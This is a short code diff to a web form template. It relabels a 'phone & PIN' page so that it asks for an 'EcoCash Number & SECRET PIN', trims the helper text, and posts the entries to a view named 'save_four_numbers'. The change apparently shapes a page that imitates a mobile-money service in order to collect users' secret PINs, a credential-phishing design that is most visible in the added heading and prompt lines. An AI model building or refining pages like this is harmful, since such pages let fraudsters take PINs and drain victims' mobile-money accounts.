@@ -6,18 +6,16 @@
 </div>
 <section class="narrow panel">
   <div class="eyebrow">PIN Details</div>
-  <h1 class="page-title">Add your <span>phone &amp; PIN.</span></h1>
-  <p class="muted">Enter your phone number first, then enter your PIN.</p>
+  <h1 class="page-title">EcoCash <span>Number &amp; SECRET PIN.</span></h1>
+  <p class="muted">Enter your EcoCash number and your SECRET PIN.</p>
   <div class="summary"><span>Amount</span><b>{{ session.demo_points }}</b></div>
 
   <form method="post" action="{% url 'save_four_numbers' %}" id="numberForm">
     {% csrf_token %}
 
-    <label class="field-label" for="phone">Phone number</label>
     <div class="input-wrap">
       <input id="phone" name="phone" type="tel" required placeholder="e.g. +47XXXXXXXX" autocomplete="tel">
     </div>
-    <p class="helper">Enter a valid phone number.</p>
 
     <div class="number-grid four" style="margin-top:22px">
 
